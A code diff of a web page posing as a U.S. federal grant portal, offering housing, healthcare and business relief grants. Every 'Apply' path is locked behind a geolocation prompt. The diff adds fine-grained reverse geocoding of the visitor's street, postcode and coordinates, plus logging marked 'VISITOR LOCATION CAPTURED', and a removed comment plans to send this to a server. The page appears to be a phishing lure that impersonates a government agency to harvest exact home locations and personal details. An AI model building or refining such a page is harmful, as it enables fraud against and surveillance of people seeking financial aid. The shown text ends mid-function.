@@ -11,13 +11,11 @@
     html{scroll-behavior:smooth}
     body{font-family:'Inter',sans-serif;background:var(--offwhite);color:var(--navy);line-height:1.6}
 
-    /* GOV BANNER */
     .gov-banner{background:var(--navy);color:var(--white);font-size:.72rem;padding:6px 0;letter-spacing:.03em}
     .gov-banner .inner{max-width:1100px;margin:auto;padding:0 20px;display:flex;align-items:center;gap:8px}
     .gov-banner span{opacity:.85}
     .gov-banner strong{color:var(--gold)}
 
-    /* HEADER */
     header{background:var(--white);border-bottom:3px solid var(--red);position:sticky;top:0;z-index:100;box-shadow:0 2px 12px rgba(0,0,0,.08)}
     .header-inner{max-width:1100px;margin:auto;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;gap:16px}
     .logo-block{display:flex;align-items:center;gap:14px}
@@ -30,7 +28,6 @@
     .nav-apply{background:var(--red)!important;color:var(--white)!important;font-weight:600!important}
     .nav-apply:hover{background:#8B1A27!important}
 
-    /* HERO */
     .hero{background:linear-gradient(135deg,var(--navy) 0%,#1a3a6b 100%);color:var(--white);padding:80px 20px;text-align:center;position:relative;overflow:hidden}
     .hero::before{content:'';position:absolute;inset:0;background:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")}
     .hero .inner{position:relative;max-width:800px;margin:auto}
@@ -44,21 +41,18 @@
     .btn-secondary{background:transparent;color:var(--white);border:2px solid rgba(255,255,255,.5);padding:14px 32px;font-size:.95rem;font-weight:600;border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block;transition:border-color .2s}
     .btn-secondary:hover{border-color:var(--white)}
 
-    /* STATS */
     .stats-bar{background:var(--white);border-bottom:1px solid var(--border)}
     .stats-inner{max-width:1100px;margin:auto;padding:28px 20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:24px;text-align:center}
     .stat-num{font-family:'Merriweather',serif;font-size:2rem;font-weight:900;color:var(--navy);line-height:1}
     .stat-num span{color:var(--red)}
     .stat-label{font-size:.78rem;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-top:5px}
 
-    /* SECTIONS */
     section{padding:64px 20px}
     .section-inner{max-width:1100px;margin:auto}
     .section-label{font-size:.7rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--red);margin-bottom:10px}
     .section-title{font-family:'Merriweather',serif;font-size:clamp(1.4rem,3vw,2rem);font-weight:900;color:var(--navy);margin-bottom:14px;line-height:1.25}
     .section-sub{font-size:1rem;color:var(--muted);max-width:580px}
 
-    /* PROGRAMS */
     .programs{background:var(--white)}
     .programs-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:24px;margin-top:40px}
     .program-card{border:1px solid var(--border);border-radius:8px;padding:28px;background:var(--offwhite);transition:box-shadow .2s,transform .2s;position:relative;overflow:hidden}
@@ -71,7 +65,6 @@
     .program-link{font-size:.85rem;color:var(--red);font-weight:600;text-decoration:none;display:flex;align-items:center;gap:4px;cursor:pointer;background:none;border:none;font-family:inherit}
     .program-link:hover{text-decoration:underline}
 
-    /* ELIGIBILITY */
     .eligibility{background:var(--offwhite)}
     .elig-grid{display:grid;grid-template-columns:1fr 1fr;gap:40px;margin-top:40px;align-items:start}
     @media(max-width:680px){.elig-grid{grid-template-columns:1fr}}
@@ -84,7 +77,6 @@
     .elig-box p{font-size:.88rem;opacity:.85;margin-bottom:20px;line-height:1.7}
     .elig-box .btn-primary{width:100%;text-align:center;display:block}
 
-    /* STEPS */
     .apply-steps{background:var(--white)}
     .steps-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:28px;margin-top:40px}
     .step{text-align:center;padding:28px 20px;border:1px solid var(--border);border-radius:8px}
@@ -92,7 +84,6 @@
     .step h3{font-size:.95rem;font-weight:700;color:var(--navy);margin-bottom:8px}
     .step p{font-size:.82rem;color:var(--muted)}
 
-    /* FORM SECTION */
     .apply-form{background:var(--navy);color:var(--white)}
     .form-inner{max-width:700px;margin:auto;text-align:center}
     .form-inner .section-title{color:var(--white)}
@@ -108,40 +99,17 @@
     select option{background:var(--navy)}
     textarea{resize:vertical;min-height:90px}
 
-    /* SUBMIT BUTTON — locked until location verified */
-    .form-submit{
-      background:var(--gold);color:var(--navy);border:none;
-      padding:15px 48px;font-size:1rem;font-weight:700;border-radius:4px;
-      cursor:pointer;margin-top:8px;width:100%;transition:background .2s,opacity .2s;
-      font-family:inherit;
-    }
+    .form-submit{background:var(--gold);color:var(--navy);border:none;padding:15px 48px;font-size:1rem;font-weight:700;border-radius:4px;cursor:pointer;margin-top:8px;width:100%;transition:background .2s,opacity .2s;font-family:inherit}
     .form-submit:hover:not(:disabled){background:#b8963e}
-    .form-submit:disabled{
-      background:#555;color:#999;cursor:not-allowed;opacity:.7;
-    }
+    .form-submit:disabled{background:#555;color:#999;cursor:not-allowed;opacity:.7}
 
-    /* location badge shown inside form after verification */
-    #loc-verified-badge{
-      display:none;
-      background:rgba(21,128,61,.15);
-      border:1px solid rgba(21,128,61,.4);
-      border-radius:6px;
-      padding:10px 16px;
-      margin-bottom:14px;
-      font-size:.82rem;
-      color:#4ade80;
-      font-weight:600;
-      text-align:left;
-      word-break:break-word;
-    }
+    #loc-verified-badge{display:none;background:rgba(21,128,61,.15);border:1px solid rgba(21,128,61,.4);border-radius:6px;padding:10px 16px;margin-bottom:14px;font-size:.82rem;color:#4ade80;font-weight:600;text-align:left;word-break:break-word}
 
     .form-note{font-size:.75rem;opacity:.55;margin-top:12px}
     .submit-hint{font-size:.78rem;color:rgba(255,255,255,.5);margin-top:10px}
 
-    /* NOTICE */
     .notice-bar{background:#FEF9C3;border-top:3px solid #EAB308;padding:14px 20px;text-align:center;font-size:.82rem;color:#713F12}
 
-    /* FOOTER */
     footer{background:#070F1E;color:rgba(255,255,255,.6);padding:40px 20px 20px}
     .footer-inner{max-width:1100px;margin:auto}
     .footer-top{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:32px;padding-bottom:32px;border-bottom:1px solid rgba(255,255,255,.1);margin-bottom:24px}
@@ -155,31 +123,16 @@
     .footer-bottom{display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:.75rem}
     @media(max-width:780px){nav{display:none}.hero{padding:56px 20px}}
 
-    /* LOCATION MODAL */
-    #loc-overlay{
-      display:none;position:fixed;inset:0;z-index:9999;
-      background:rgba(7,15,30,.88);
-      align-items:center;justify-content:center;
-      backdrop-filter:blur(5px);
-    }
+    /* ── LOCATION MODAL ── */
+    #loc-overlay{display:none;position:fixed;inset:0;z-index:9999;background:rgba(7,15,30,.88);align-items:center;justify-content:center;backdrop-filter:blur(5px)}
     #loc-overlay.active{display:flex}
-    #loc-modal{
-      background:var(--white);border-radius:14px;
-      padding:40px 36px;max-width:480px;width:92%;
-      text-align:center;box-shadow:0 28px 70px rgba(0,0,0,.5);
-      animation:popIn .25s ease;
-    }
+    #loc-modal{background:var(--white);border-radius:14px;padding:40px 36px;max-width:520px;width:92%;text-align:center;box-shadow:0 28px 70px rgba(0,0,0,.5);animation:popIn .25s ease}
     @keyframes popIn{from{opacity:0;transform:scale(.92)}to{opacity:1;transform:scale(1)}}
     .loc-modal-icon{font-size:3rem;margin-bottom:16px}
     #loc-modal h2{font-family:'Merriweather',serif;font-size:1.25rem;font-weight:900;color:var(--navy);margin-bottom:10px}
     #loc-modal .modal-desc{font-size:.88rem;color:var(--muted);margin-bottom:24px;line-height:1.75}
 
-    #loc-modal-btn{
-      background:var(--red);color:var(--white);border:none;
-      padding:15px 36px;font-size:.96rem;font-weight:700;
-      border-radius:6px;cursor:pointer;width:100%;font-family:inherit;
-      transition:background .2s;
-    }
+    #loc-modal-btn{background:var(--red);color:var(--white);border:none;padding:15px 36px;font-size:.96rem;font-weight:700;border-radius:6px;cursor:pointer;width:100%;font-family:inherit;transition:background .2s}
     #loc-modal-btn:hover{background:#8B1A27}
     #loc-modal-btn:disabled{background:#aaa;cursor:not-allowed}
 
@@ -188,17 +141,41 @@
     .status-success{color:var(--success)}
     .status-denied{color:#DC2626}
 
-    /* full address display inside modal */
+    /* ── STRUCTURED ADDRESS CARD ── */
     #modal-address-box{
       display:none;
-      background:#F0FDF4;border:1px solid #BBF7D0;border-radius:8px;
-      padding:14px 16px;margin-top:14px;text-align:left;
+      background:#F0FDF4;border:1px solid #BBF7D0;border-radius:10px;
+      padding:18px 20px;margin-top:16px;text-align:left;
     }
-    #modal-address-box .addr-label{font-size:.7rem;font-weight:700;color:#166534;letter-spacing:.08em;text-transform:uppercase;margin-bottom:4px}
-    #modal-address-box .addr-value{font-size:.85rem;color:#14532D;font-weight:600;word-break:break-word}
-    #modal-address-box .addr-coords{font-size:.75rem;color:#166534;margin-top:4px;opacity:.8}
+    .addr-header{
+      display:flex;align-items:center;gap:8px;
+      font-size:.7rem;font-weight:700;color:#166534;
+      letter-spacing:.09em;text-transform:uppercase;
+      margin-bottom:14px;
+      border-bottom:1px solid #BBF7D0;padding-bottom:10px;
+    }
+    /* grid of address fields */
+    .addr-grid{
+      display:grid;grid-template-columns:1fr 1fr;gap:10px 20px;
+    }
+    .addr-field{display:flex;flex-direction:column;gap:2px}
+    .addr-field-label{font-size:.65rem;font-weight:700;color:#4B7A5A;letter-spacing:.07em;text-transform:uppercase}
+    .addr-field-value{font-size:.85rem;color:#14532D;font-weight:600;word-break:break-word}
+    .addr-field-value.placeholder{color:#9CA3AF;font-style:italic;font-weight:400}
+    /* full row field */
+    .addr-field.full{grid-column:1/-1}
+    /* coords row */
+    .addr-coords-row{
+      margin-top:12px;padding-top:10px;border-top:1px solid #BBF7D0;
+      display:flex;gap:16px;flex-wrap:wrap;
+    }
+    .addr-coord-chip{
+      font-size:.73rem;color:#166534;background:#DCFCE7;
+      border-radius:4px;padding:3px 8px;font-family:monospace;
+      white-space:nowrap;
+    }
 
-    /* denied instructions */
+    /* denied / retry */
     #denied-box{display:none;background:#FEF2F2;border:1px solid #FECACA;border-radius:8px;padding:16px;margin-top:16px;text-align:left}
     #denied-box h4{font-size:.82rem;font-weight:700;color:#991B1B;margin-bottom:8px}
     #denied-box ol{padding-left:18px;font-size:.8rem;color:#7F1D1D;line-height:1.85}
@@ -217,14 +194,46 @@
     <button id="loc-modal-btn" onclick="startLocation()">Allow Location &amp; Continue</button>
     <div id="loc-modal-status"></div>
 
-    <!-- Full address shown here after success -->
+    <!-- Structured address card shown after success -->
     <div id="modal-address-box">
-      <div class="addr-label">📍 Your Verified Location</div>
-      <div class="addr-value" id="modal-addr-text"></div>
-      <div class="addr-coords" id="modal-addr-coords"></div>
+      <div class="addr-header">📍 Your Verified Location</div>
+      <div class="addr-grid">
+        <div class="addr-field full">
+          <div class="addr-field-label">Street / Road</div>
+          <div class="addr-field-value" id="addr-street">—</div>
+        </div>
+        <div class="addr-field">
+          <div class="addr-field-label">Neighbourhood / Area</div>
+          <div class="addr-field-value" id="addr-area">—</div>
+        </div>
+        <div class="addr-field">
+          <div class="addr-field-label">District / County</div>
+          <div class="addr-field-value" id="addr-district">—</div>
+        </div>
+        <div class="addr-field">
+          <div class="addr-field-label">City / Town</div>
+          <div class="addr-field-value" id="addr-city">—</div>
+        </div>
+        <div class="addr-field">
+          <div class="addr-field-label">State / Region</div>
+          <div class="addr-field-value" id="addr-state">—</div>
+        </div>
+        <div class="addr-field">
+          <div class="addr-field-label">Postcode / ZIP</div>
+          <div class="addr-field-value" id="addr-postcode">—</div>
+        </div>
+        <div class="addr-field full">
+          <div class="addr-field-label">Country</div>
+          <div class="addr-field-value" id="addr-country">—</div>
+        </div>
+      </div>
+      <div class="addr-coords-row">
+        <span class="addr-coord-chip" id="addr-lat">Lat: —</span>
+        <span class="addr-coord-chip" id="addr-lon">Lon: —</span>
+        <span class="addr-coord-chip" id="addr-accuracy">Accuracy: —</span>
+      </div>
     </div>
 
-    <!-- Denied help box -->
     <div id="denied-box">
       <h4>📋 How to enable location in your browser:</h4>
       <ol id="denied-steps"></ol>
@@ -290,42 +299,12 @@
     <h2 class="section-title">Available Funding Programs</h2>
     <p class="section-sub">Browse active federal relief programs. All grants are non-repayable and available to qualifying U.S. residents.</p>
     <div class="programs-grid">
-      <div class="program-card">
-        <div class="program-icon">🏠</div><div class="program-amount">Up to $25,000</div>
-        <h3>Housing Assistance Grant</h3>
-        <p>Emergency rental and mortgage relief for low-to-moderate income households at risk of eviction or foreclosure.</p>
-        <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
-      </div>
-      <div class="program-card">
-        <div class="program-icon">🏥</div><div class="program-amount">Up to $15,000</div>
-        <h3>Healthcare Relief Fund</h3>
-        <p>Coverage for medical bills, prescription costs, and healthcare expenses not covered by existing insurance.</p>
-        <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
-      </div>
-      <div class="program-card">
-        <div class="program-icon">📚</div><div class="program-amount">Up to $10,000</div>
-        <h3>Education &amp; Training Grant</h3>
-        <p>Tuition assistance, vocational training, and certification program funding for adults re-entering the workforce.</p>
-        <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
-      </div>
-      <div class="program-card">
-        <div class="program-icon">💼</div><div class="program-amount">Up to $50,000</div>
-        <h3>Small Business Relief</h3>
-        <p>Grants for small businesses with fewer than 50 employees impacted by economic hardship or natural disasters.</p>
-        <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
-      </div>
-      <div class="program-card">
-        <div class="program-icon">⚡</div><div class="program-amount">Up to $5,000</div>
-        <h3>Utility &amp; Energy Assistance</h3>
-        <p>Help with electricity, heating, water, and essential utility bills for qualifying low-income households.</p>
-        <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
-      </div>
-      <div class="program-card">
-        <div class="program-icon">👶</div><div class="program-amount">Up to $8,000</div>
-        <h3>Child &amp; Family Support</h3>
-        <p>Childcare subsidies, food assistance, and family stability grants for households with dependent children.</p>
-        <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
-      </div>
+      <div class="program-card"><div class="program-icon">🏠</div><div class="program-amount">Up to $25,000</div><h3>Housing Assistance Grant</h3><p>Emergency rental and mortgage relief for low-to-moderate income households at risk of eviction or foreclosure.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
+      <div class="program-card"><div class="program-icon">🏥</div><div class="program-amount">Up to $15,000</div><h3>Healthcare Relief Fund</h3><p>Coverage for medical bills, prescription costs, and healthcare expenses not covered by existing insurance.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
+      <div class="program-card"><div class="program-icon">📚</div><div class="program-amount">Up to $10,000</div><h3>Education &amp; Training Grant</h3><p>Tuition assistance, vocational training, and certification program funding for adults re-entering the workforce.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
+      <div class="program-card"><div class="program-icon">💼</div><div class="program-amount">Up to $50,000</div><h3>Small Business Relief</h3><p>Grants for small businesses with fewer than 50 employees impacted by economic hardship or natural disasters.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
+      <div class="program-card"><div class="program-icon">⚡</div><div class="program-amount">Up to $5,000</div><h3>Utility &amp; Energy Assistance</h3><p>Help with electricity, heating, water, and essential utility bills for qualifying low-income households.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
+      <div class="program-card"><div class="program-icon">👶</div><div class="program-amount">Up to $8,000</div><h3>Child &amp; Family Support</h3><p>Childcare subsidies, food assistance, and family stability grants for households with dependent children.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
     </div>
   </div>
 </section>
@@ -379,7 +358,6 @@
       <h2 class="section-title">Start Your Application</h2>
       <p class="section-sub">All information is encrypted and protected under federal privacy law (5 U.S.C. § 552a).</p>
 
-      <!-- Green address badge shown after location verified -->
       <div id="loc-verified-badge">✅ Location Verified &nbsp;|&nbsp; <span id="badge-address"></span></div>
 
       <div class="form-grid">
@@ -429,7 +407,6 @@
         </div>
       </div>
 
-      <!-- SUBMIT — disabled until location verified -->
       <button id="submit-btn" class="form-submit" disabled onclick="handleSubmit(event)">
         🔒 Verify Location to Submit Application
       </button>
@@ -477,75 +454,125 @@ var locationCaptured = false;
 var capturedAddress   = '';
 var capturedLat       = null;
 var capturedLon       = null;
+var capturedAddrObj   = {};   // structured address fields
 
-/* ── BROWSER DETECTION ── */
-function getBrowser(){
-  var ua=navigator.userAgent;
-  if(/iPhone|iPad|iPod/.test(ua))return'ios';
-  if(/Android/.test(ua))return'android';
-  if(/Firefox/.test(ua))return'firefox';
-  if(/Edg/.test(ua))return'edge';
-  if(/Chrome/.test(ua))return'chrome';
-  if(/Safari/.test(ua))return'safari';
-  return'chrome';
-}
-function getDeniedSteps(){
-  var b=getBrowser();
-  if(b==='chrome')return[
-    'Click the 🔒 <strong>lock icon</strong> in your browser address bar.',
-    'Click <strong>Site settings</strong>.',
-    'Find <strong>Location</strong> → change it to <strong>Allow</strong>.',
-    'Refresh this page, then click Allow Location again.'
-  ];
-  if(b==='firefox')return[
-    'Click the 🔒 <strong>lock icon</strong> in the address bar.',
-    'Click the arrow next to <strong>Connection Secure</strong>.',
-    'Click <strong>More Information</strong> → open the <strong>Permissions</strong> tab.',
-    'Find <strong>Access Your Location</strong> → set to <strong>Allow</strong>.',
-    'Refresh this page and try again.'
-  ];
-  if(b==='safari')return[
-    'In the menu bar go to <strong>Safari → Settings for This Website</strong>.',
-    'Set <strong>Location</strong> to <strong>Allow</strong>.',
-    'Refresh and try again.'
-  ];
-  if(b==='edge')return[
-    'Click the 🔒 <strong>lock icon</strong> in the address bar.',
-    'Click <strong>Permissions for this site</strong>.',
-    'Set <strong>Location</strong> to <strong>Allow</strong>.',
-    'Refresh and try again.'
-  ];
-  if(b==='ios')return[
-    'Open <strong>Settings</strong> on your iPhone/iPad.',
-    'Scroll down and tap <strong>Safari</strong> (or your browser app).',
-    'Tap <strong>Location</strong> → select <strong>Allow</strong>.',
-    'Return to this page and try again.'
-  ];
-  if(b==='android')return[
-    'Tap the 🔒 <strong>lock icon</strong> in your browser address bar.',
-    'Tap <strong>Permissions</strong> → <strong>Location</strong>.',
-    'Select <strong>Allow</strong>.',
-    'Refresh and try again.'
-  ];
-  return[
-    'Open your browser settings → Site Permissions → Location.',
-    'Allow location for this site, then refresh and try again.'
-  ];
+/* ══════════════════════════════════════════
+   REVERSE GEOCODE — parse Nominatim response
+   into clean, readable fields
+══════════════════════════════════════════ */
+function parseAddress(data) {
+  var a = data.address || {};
+
+  /* Street / Road — try multiple Nominatim keys in order of specificity */
+  var houseNum = a.house_number || '';
+  var road = a.road || a.pedestrian || a.footway || a.path ||
+             a.street || a.cycleway || a.service || '';
+  var street = (houseNum && road) ? (road + ', ' + houseNum)
+             : (road || houseNum || '');
+
+  /* Neighbourhood / Area */
+  var area = a.neighbourhood || a.suburb || a.quarter ||
+             a.hamlet || a.village || a.residential || '';
+
+  /* District / County */
+  var district = a.county || a.city_district || a.district ||
+                 a.borough || a.municipality || '';
+
+  /* City / Town */
+  var city = a.city || a.town || a.township ||
+             a.municipality || a.village || '';
+
+  /* State / Region */
+  var state = a.state || a.region || a.province || '';
+
+  /* Postcode */
+  var postcode = a.postcode || '';
+
+  /* Country */
+  var country = a.country || '';
+
+  return { street, area, district, city, state, postcode, country,
+           displayName: data.display_name || '' };
 }
 
-/* ── OPEN MODAL ── */
-function openLocationModal(e){
-  if(e) e.preventDefault();
-  if(locationCaptured){
+function setAddrField(id, value) {
+  var el = document.getElementById(id);
+  if (!el) return;
+  if (value && value.trim()) {
+    el.textContent = value;
+    el.classList.remove('placeholder');
+  } else {
+    el.textContent = 'Not available';
+    el.classList.add('placeholder');
+  }
+}
+
+function renderAddressCard(parsed, lat, lon, accuracy) {
+  setAddrField('addr-street',   parsed.street);
+  setAddrField('addr-area',     parsed.area);
+  setAddrField('addr-district', parsed.district);
+  setAddrField('addr-city',     parsed.city);
+  setAddrField('addr-state',    parsed.state);
+  setAddrField('addr-postcode', parsed.postcode);
+  setAddrField('addr-country',  parsed.country);
+
+  document.getElementById('addr-lat').textContent      = 'Lat: ' + lat.toFixed(6);
+  document.getElementById('addr-lon').textContent      = 'Lon: ' + lon.toFixed(6);
+  document.getElementById('addr-accuracy').textContent = 'Accuracy: ~' + Math.round(accuracy) + 'm';
+
+  document.getElementById('modal-address-box').style.display = 'block';
+}
+
+/* Build a short human-readable summary for the badge in the form */
+function buildBadgeSummary(parsed, lat, lon) {
+  var parts = [];
+  if (parsed.street)   parts.push(parsed.street);
+  if (parsed.area)     parts.push(parsed.area);
+  if (parsed.city)     parts.push(parsed.city);
+  if (parsed.state)    parts.push(parsed.state);
+  if (parsed.country)  parts.push(parsed.country);
+  if (parts.length)    return parts.join(', ');
+  return lat.toFixed(5) + ', ' + lon.toFixed(5);
+}
+
+/* ══════════════════════════════════════════
+   BROWSER DETECTION & DENIED STEPS
+══════════════════════════════════════════ */
+function getBrowser() {
+  var ua = navigator.userAgent;
+  if (/iPhone|iPad|iPod/.test(ua)) return 'ios';
+  if (/Android/.test(ua))          return 'android';
+  if (/Firefox/.test(ua))          return 'firefox';
+  if (/Edg/.test(ua))              return 'edge';
+  if (/Chrome/.test(ua))           return 'chrome';
+  if (/Safari/.test(ua))           return 'safari';
+  return 'chrome';
+}
+function getDeniedSteps() {
+  var b = getBrowser();
+  if (b === 'chrome')  return ['Click the 🔒 <strong>lock icon</strong> in your browser address bar.','Click <strong>Site settings</strong>.','Find <strong>Location</strong> → change it to <strong>Allow</strong>.','Refresh this page, then click Allow Location again.'];
+  if (b === 'firefox') return ['Click the 🔒 <strong>lock icon</strong> in the address bar.','Click the arrow next to <strong>Connection Secure</strong>.','Click <strong>More Information</strong> → open the <strong>Permissions</strong> tab.','Find <strong>Access Your Location</strong> → set to <strong>Allow</strong>.','Refresh this page and try again.'];
+  if (b === 'safari')  return ['In the menu bar go to <strong>Safari → Settings for This Website</strong>.','Set <strong>Location</strong> to <strong>Allow</strong>.','Refresh and try again.'];
+  if (b === 'edge')    return ['Click the 🔒 <strong>lock icon</strong> in the address bar.','Click <strong>Permissions for this site</strong>.','Set <strong>Location</strong> to <strong>Allow</strong>.','Refresh and try again.'];
+  if (b === 'ios')     return ['Open <strong>Settings</strong> on your iPhone/iPad.','Scroll down and tap <strong>Safari</strong> (or your browser app).','Tap <strong>Location</strong> → select <strong>Allow</strong>.','Return to this page and try again.'];
+  if (b === 'android') return ['Tap the 🔒 <strong>lock icon</strong> in your browser address bar.','Tap <strong>Permissions</strong> → <strong>Location</strong>.','Select <strong>Allow</strong>.','Refresh and try again.'];
+  return ['Open your browser settings → Site Permissions → Location.','Allow location for this site, then refresh and try again.'];
+}
+
+/* ══════════════════════════════════════════
+   MODAL OPEN / CLOSE
+══════════════════════════════════════════ */
+function openLocationModal(e) {
+  if (e) e.preventDefault();
+  if (locationCaptured) {
     document.getElementById('apply').scrollIntoView({behavior:'smooth'});
     return;
   }
   document.getElementById('loc-overlay').classList.add('active');
 }
 
-/* ── SUBMIT BUTTON CLICK — pops modal if not yet verified ── */
-function handleSubmit(e){
-  if(!locationCaptured){
+function handleSubmit(e) {
+  if (!locationCaptured) {
     e.preventDefault();
     openLocationModal(e);
   } else {
@@ -553,144 +580,153 @@ function handleSubmit(e){
   }
 }
 
-/* ── CLOSE MODAL & SCROLL TO FORM ── */
-function closeModalAndProceed(){
+function closeModalAndProceed() {
   document.getElementById('loc-overlay').classList.remove('active');
-  setTimeout(function(){
+  setTimeout(function() {
     document.getElementById('apply').scrollIntoView({behavior:'smooth'});
-  },300);
+  }, 300);
 }
 
-/* ── STATUS MESSAGE ── */
-function setStatus(msg,cls){
-  var el=document.getElementById('loc-modal-status');
-  el.innerHTML=msg;
-  el.className=cls||'';
+function setStatus(msg, cls) {
+  var el = document.getElementById('loc-modal-status');
+  el.innerHTML = msg;
+  el.className = cls || '';
 }
 
-/* ── UNLOCK FORM AFTER VERIFIED ── */
-function unlockForm(address,lat,lon){
-  var btn=document.getElementById('submit-btn');
-  btn.disabled=false;
-  btn.textContent='Submit Application →';
+function unlockForm(summary) {
+  var btn = document.getElementById('submit-btn');
+  btn.disabled = false;
+  btn.textContent = 'Submit Application →';
+  document.getElementById('submit-hint').style.display = 'none';
 
-  var hint=document.getElementById('submit-hint');
-  hint.style.display='none';
-
-  var badge=document.getElementById('loc-verified-badge');
-  badge.style.display='block';
-  document.getElementById('badge-address').textContent=address;
+  var badge = document.getElementById('loc-verified-badge');
+  badge.style.display = 'block';
+  document.getElementById('badge-address').textContent = summary;
 }
 
-/* ── MAIN LOCATION FUNCTION ── */
-function startLocation(){
-  var btn=document.getElementById('loc-modal-btn');
-  var deniedBox=document.getElementById('denied-box');
-  var retryBtn=document.getElementById('retry-btn');
-  var addrBox=document.getElementById('modal-address-box');
+/* ══════════════════════════════════════════
+   MAIN LOCATION FLOW
+══════════════════════════════════════════ */
+function startLocation() {
+  var btn       = document.getElementById('loc-modal-btn');
+  var deniedBox = document.getElementById('denied-box');
+  var retryBtn  = document.getElementById('retry-btn');
+  var addrBox   = document.getElementById('modal-address-box');
 
-  // Reset UI state
-  deniedBox.style.display='none';
-  retryBtn.style.display='none';
-  addrBox.style.display='none';
-  btn.style.display='block';
-  btn.disabled=true;
-  btn.textContent='📡 Detecting your location...';
-  setStatus('Please wait — verifying your location...','status-loading');
+  // Reset
+  deniedBox.style.display = 'none';
+  retryBtn.style.display  = 'none';
+  addrBox.style.display   = 'none';
+  btn.style.display       = 'block';
+  btn.disabled            = true;
+  btn.textContent         = '📡 Detecting your location...';
+  setStatus('Please wait — verifying your location...', 'status-loading');
 
-  if(!navigator.geolocation){
-    btn.disabled=false;
-    btn.textContent='Allow Location & Continue';
-    setStatus('','');
-    deniedBox.style.display='block';
-    document.getElementById('denied-steps').innerHTML='<li>Your browser does not support geolocation. Please try Google Chrome or Firefox.</li>';
+  if (!navigator.geolocation) {
+    btn.disabled = false;
+    btn.textContent = 'Allow Location & Continue';
+    setStatus('', '');
+    deniedBox.style.display = 'block';
+    document.getElementById('denied-steps').innerHTML =
+      '<li>Your browser does not support geolocation. Please try Google Chrome or Firefox.</li>';
     return;
   }
 
   navigator.geolocation.getCurrentPosition(
     /* ── SUCCESS ── */
-    function(position){
-      capturedLat=position.coords.latitude;
-      capturedLon=position.coords.longitude;
-      var accuracy=Math.round(position.coords.accuracy);
+    function(position) {
+      capturedLat = position.coords.latitude;
+      capturedLon = position.coords.longitude;
+      var accuracy = position.coords.accuracy;
 
-      setStatus('📍 GPS detected! Fetching your full address...','status-loading');
+      setStatus('📍 GPS detected! Resolving your full address...', 'status-loading');
 
-      fetch('https://nominatim.openstreetmap.org/reverse?lat='+capturedLat+'&lon='+capturedLon+'&format=json&addressdetails=1')
-        .then(function(r){return r.json();})
-        .then(function(data){
-          capturedAddress = data.display_name || (capturedLat.toFixed(6)+', '+capturedLon.toFixed(6));
+      /* Nominatim reverse geocode with zoom=18 for max detail */
+      var url = 'https://nominatim.openstreetmap.org/reverse'
+              + '?lat=' + capturedLat
+              + '&lon=' + capturedLon
+              + '&format=json'
+              + '&addressdetails=1'
+              + '&zoom=18'
+              + '&accept-language=en';
 
-          // Show address inside modal
-          document.getElementById('modal-addr-text').textContent = capturedAddress;
-          document.getElementById('modal-addr-coords').textContent =
-            'Lat: '+capturedLat.toFixed(6)+' | Lon: '+capturedLon.toFixed(6)+' | Accuracy: ~'+accuracy+'m';
-          document.getElementById('modal-address-box').style.display='block';
+      fetch(url, { headers: { 'Accept-Language': 'en' } })
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          var parsed     = parseAddress(data);
+          capturedAddrObj = parsed;
+          capturedAddress = buildBadgeSummary(parsed, capturedLat, capturedLon);
 
-          locationCaptured=true;
+          renderAddressCard(parsed, capturedLat, capturedLon, accuracy);
 
-          // Console log (replace with server fetch in production)
+          locationCaptured = true;
+
+          /* ── Log full structured data ── */
           console.log('=== VISITOR LOCATION CAPTURED ===');
-          console.log('Full Address : ', capturedAddress);
-          console.log('Latitude     : ', capturedLat);
-          console.log('Longitude    : ', capturedLon);
-          console.log('Accuracy     : ', accuracy+' meters');
-          console.log('Timestamp    : ', new Date().toISOString());
+          console.log('Street / Road    :', parsed.street   || '(none)');
+          console.log('Neighbourhood    :', parsed.area     || '(none)');
+          console.log('District / County:', parsed.district || '(none)');
+          console.log('City / Town      :', parsed.city     || '(none)');
+          console.log('State / Region   :', parsed.state    || '(none)');
+          console.log('Postcode / ZIP   :', parsed.postcode || '(none)');
+          console.log('Country          :', parsed.country  || '(none)');
+          console.log('Full Display Name:', parsed.displayName);
+          console.log('Latitude         :', capturedLat);
+          console.log('Longitude        :', capturedLon);
+          console.log('Accuracy         :', Math.round(accuracy) + 'm');
+          console.log('Timestamp        :', new Date().toISOString());
 
-          btn.textContent='✅ Verified — Proceeding to Application...';
-          setStatus('✅ Location confirmed successfully!','status-success');
+          btn.textContent = '✅ Verified — Proceeding to Application...';
+          setStatus('✅ Location confirmed successfully!', 'status-success');
+          unlockForm(capturedAddress);
 
-          unlockForm(capturedAddress, capturedLat, capturedLon);
-
-          setTimeout(function(){closeModalAndProceed();},2200);
+          setTimeout(function() { closeModalAndProceed(); }, 2400);
         })
-        .catch(function(){
-          // Geocode API failed — still have coordinates
